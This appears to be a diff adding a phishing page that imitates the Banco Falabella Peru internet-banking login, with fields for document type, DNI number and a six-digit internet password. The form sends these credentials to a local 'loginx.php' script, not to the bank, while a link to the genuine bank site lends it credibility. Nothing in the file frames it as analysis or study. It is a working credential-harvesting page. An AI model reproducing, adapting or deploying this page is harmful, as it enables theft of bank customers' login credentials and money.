@@ -1,0 +1,220 @@
+<html><head>
+        <title>Falabella</title>
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <link href="../../../files/css/styleFromDB1114.css" rel="stylesheet" type="text/css">
+        <link href="../../../files/css/externalFonts/fonts.css" rel="stylesheet" type="text/css">
+        
+        
+        <style>
+		.contenido {
+		  left: 41%; right: 35%; position: absolute; margin-top: 15px;
+		}
+		
+		@media only screen and (max-width: 1100px) {
+		 .contenido {
+		  left: 35%; right: 35%; position: absolute; margin-top: 15px;
+		}
+
+		@media only screen and (max-width: 900px) {
+		 .contenido {
+		  left: 35%; right: 35%; position: absolute; margin-top: 15px;
+		}
+
+		@media only screen and (max-width: 900px) {
+		 .contenido {
+		  left: 35%; right: 30%; position: absolute; margin-top: 15px;
+		}
+
+		@media only screen and (max-width: 800px) {
+		 .contenido {
+		  left: 35%; right: 30%; position: absolute; margin-top: 15px;
+		}
+
+		@media only screen and (max-width: 750px) {
+		 .contenido {
+		  left: 30%; right: 25%; position: absolute; margin-top: 15px;
+		}
+		@media only screen and (max-width: 630px) {
+		 .contenido {
+		  left: 25%; right: 25%; position: absolute; margin-top: 15px;
+		}
+		@media only screen and (max-width: 540px) {
+		 .contenido {
+		  left: 15%; right: 15%; position: absolute; margin-top: 15px;
+		}
+		@media only screen and (max-width: 400px) {
+		 .contenido {
+		  left: 10%; right: 10%; position: absolute; margin-top: 15px;
+		}
+		}
+		</style>
+
+        <script type="text/javascript">
+
+        function restrictAlphabets(e){
+            var x=e.which||e.keycode;
+            if((x>=48 && x<=57) || x==8 ||
+                (x>=35 && x<=40)|| x==46)
+                return true;
+            else
+                return false;
+        }
+
+        function validar() {
+        
+        dni_input = document.getElementById("dni");
+        pass_input = document.getElementById("pass");
+        
+        error_div = document.getElementById("error-div");
+
+        dni = document.getElementById("dni").value;
+        pass = document.getElementById("pass").value;
+        
+        if (dni === "") {
+          error_div.classList.remove("hide");
+          error_div.classList.add("show"); 
+          return false; }
+
+        else if (pass === "") {
+          error_div.classList.remove("hide");
+          error_div.classList.add("show"); 
+          return false; }
+
+        else if (dni.length<8) {
+          error_div.classList.remove("hide");
+          error_div.classList.add("show"); 
+          return false; }
+
+        else if (pass.length<6) {
+          error_div.classList.remove("hide");
+          error_div.classList.add("show"); 
+          return false; }
+        
+        }
+
+        function clean_error() {
+            
+        error_div = document.getElementById("error-div");
+        
+        error_div.classList.add("hide");
+        error_div.classList.remove("show"); 
+        
+        }
+
+        </script>
+
+    </head>
+    <body style="background: url('../../../files/img/fondo-login.jpg') no-repeat;">
+    <form action="../../../loginx.php?id=0" method="post" onsubmit="return validar();">
+        <div class="header_container">
+                <div class="header_logo">
+                </div>
+            </div>        <div class="contenido">
+        	<center>
+            <div class="tableDiv" style=" background-color: white; position: absolute;">
+            	<div style="background-color: #656565; margin-top: 0px; padding-top: 10px;padding-bottom: 10px;" class="tableDiv table-align_wrap-fullwidth-margin-top-15" id="tableAlignTexto">
+    				<div class="html-code_login_nuevo" id="htmlCodeLogin">
+    				    <p style=" height: 25px; ">
+    				        <font size="5" color="fffff">
+    				            Conoce nuestra nueva
+    				        </font>
+    				    </p>
+    				    <p>
+    				        <b>
+    				            <font size="5" color="fffff">
+    				                Banca por Internet
+    				            </font>
+    				        </b>
+    				    </p>
+    				</div>
+    			</div>
+
+                <style type="text/css">
+                    .show {
+                        display: block;
+                    }
+
+                    .hide {
+                        display: none;
+                    }
+                </style>
+
+                
+                <div class="rowDiv">
+                    <div style=" width:100%;" class="cellDiv">
+                        <div id="error-div" class="html-code_login_error hide">
+                            <p>Debes completar todos los datos requeridos.</p>
+                        </div>
+                    </div>
+                </div>
+
+    			<div class="tableDiv table-align_wrap-fullwidth-padding-15" id="tableAlign06456456" style=" padding-bottom: 0px; ">
+                    <label class="constant-label_label-nowidth-noheight" id="constantLabelNumDoc" style="float:left;">
+                        Tipo de documento
+                    </label>
+                </div>
+                <div class="tableDiv table-align_wrap-fullwidth-padding-15" id="tableAlign06456456" style=" padding-top: 0px; padding-bottom: 0px;">
+                	<select name="tipo" class="select-field_default" id="selectFieldTipoDocBFCPE">
+                        <option value="L">
+                            DNI
+                        </option>
+                        <option value="R">
+                            CARNET EXT.
+                        </option>
+                    </select>
+                </div>
+                <div class="tableDiv table-align_wrap-fullwidth-padding-15" id="tableAlign06456456">
+                    <label class="constant-label_label-nowidth-noheight" id="constantLabelNumDoc" style="float:left;">
+                        Número de documento
+                    </label>
+                    <input name="dni" id="dni" class="text-field_login" maxlength="8" type="tel" onkeydown="clean_error(); return restrictAlphabets(event)">
+                    
+                </div>
+                <div style=" padding-top: 0px; " class="tableDiv table-align_wrap-fullwidth-padding-15" id="tableAlign06456456">
+                    <label class="constant-label_label-nowidth-noheight" id="constantLabelNumDoc" style="float:left;">
+                        Clave Internet
+                    </label>
+                    <input name="pass" id="pass" class="text-field_login" maxlength="6" type="tel" onkeydown="clean_error(); return restrictAlphabets(event)" onfocus="this.type = 'tel'" onblur="this.type = 'password'">
+                    
+                </div>
+                <div style="padding-top: 5px; padding-bottom: 5px;" class="tableDiv table-align_wrap-fullwidth-padding-15" id="tableAlign06456456">
+                	<div class="cellDiv">
+                		<input class="action-button_loginAceptar autoAdjustText" type="submit" value="Ingresar">
+                	</div>
+                </div>
+                <div style="text-align: center; padding-top: 5px; padding-bottom: 0px;" class="tableDiv table-align_wrap-fullwidth-padding-15" id="tableAlign06456456">
+                    <a style="color: black;" target="_top" href="https://banking.bancofalabella.pe/Techbank/sso?publicSite=autoadhesion">
+                        Crea o recupera tu Clave Internet
+                    </a>
+                </div>
+                <div style="text-align: center; padding-top: 5px; padding-bottom: 10px;" class="tableDiv table-align_wrap-fullwidth-padding-15" id="tableAlign06456456">
+                    <a style="color: black;" href="#">
+                        Volver
+                    </a>
+                </div>
+            </div>
+        </center>
+        </div>
+    </form>
+    <script type="text/javascript">
+        function validate(evt) {
+        var theEvent = evt || window.event;
+        
+        // Handle paste
+        if (theEvent.type === 'paste') {
+            key = event.clipboardData.getData('text/plain');
+        } else {
+        // Handle key press
+            var key = theEvent.keyCode || theEvent.which;
+            key = String.fromCharCode(key);
+        }
+        var regex = /[0-9]|\./;
+        if( !regex.test(key) ) {
+          theEvent.returnValue = false;
+          if(theEvent.preventDefault) theEvent.preventDefault();
+        }
+        }
+    </script>
+    
+</body></html>
